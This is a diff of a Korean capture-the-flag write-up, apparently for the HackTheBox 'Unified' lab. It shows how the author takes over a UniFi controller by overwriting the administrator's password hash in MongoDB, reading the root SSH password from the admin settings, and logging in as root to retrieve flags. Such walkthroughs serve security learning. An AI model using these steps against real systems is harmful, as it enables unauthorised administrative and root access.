@@ -230,7 +230,52 @@ mongo에는 `db.admin.find()`와 마찬가지로 항목을 업데이트 하는 `
 $6$91MIYRtYntosD8IH$E993UyqhPsVRjCjT4K02XiTqh07BZXOx4Od8t16MLTq14c5hBZ4kHfy4tUrVBiu3vSRaci9f49p7AUPtEX0MW.
 ```
 
+다시 mongo에 접속해서 db.admin.update로 x_shadow 값을 업데이트 시켜보자. (다른 풀이 중에는 insert로 계정을 추가하는 방식도 존재한다.)
+``` bash
+# use ace
 
+# db.admin.update({ "_id" : ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow" : "$6$91MIYRtYntosD8IH$E993UyqhPsVRjCjT4K02XiTqh07BZXOx4Od8t16MLTq14c5hBZ4kHfy4tUrVBiu3vSRaci9f49p7AUPtEX0MW."}})
+WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
+
+# db.admin.find()
+{ "_id" : ObjectId("61ce278f46e0fb0012d47ee4"), "name" : "administrator", "email" : "administrator@unified.htb", "x_shadow" : "$6$91MIYRtYntosD8IH$E993UyqhPsVRjCjT4K02XiTqh07BZXOx4Od8t16MLTq14c5hBZ4kHfy4tUrVBiu3vSRaci9f49p7AUPtEX0MW.", "time_created" : NumberLong(1640900495), "last_site_name" : "default", "ui_settings" : { "neverCheckForUpdate" : true...
+```
+
+
+## login administrator & get root flag
+---
+성공적으로 hash값이 변경되었다면 로그인을 해보자. 아래와 같이 성공적으로 로그인 할 수 있다.
+![](../assets/image_post/20240312182934.png)
+
+administrator로 로그인한 만큼, 관리자 설정 부분을 먼저 확인하였다. 아래와 같이 ssh 자동 로그인과 관련된 설정에서 root 계정의 암호를 확인할 수 있다.
+![](../assets/image_post/20240312183400.png)
+
+이제 ssh를 통해 로그인 해보자.
+``` bash
+┌──(root㉿kali)-[/home/user]
+└─# ssh root@10.129.163.168
+root@10.129.163.168's password:
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+root@unified:~#
+```
+
+root로 로그인하면 바로 root.txt 파일에 접근이 가능하다.
+``` bash
+root@unified:~# ls
+root.txt
+root@unified:~# cat root.txt
+    e50bc93c75b634e4b272d2f771c33681
+```
 
 ## Get user flag
 ---
@@ -249,4 +294,9 @@ drwx------ 2 1000 1000 4096 Jan  2  2022 .ssh
 # cat /home/michael/user.txt
 6ced1a6a89e666c0620cdb10262ba127
 ```
+
+## conclusion
+---
+해당 문제의 경우 log4shell과 moongo를 이용하여 풀어야하는 문제였다. mongo 관련 된 부분은 매우 낯설었다. db와 관련된 부분도 확실히 좀 더 공부가 필요할 듯 하다.
+![](../assets/image_post/20240312183850.png)
 
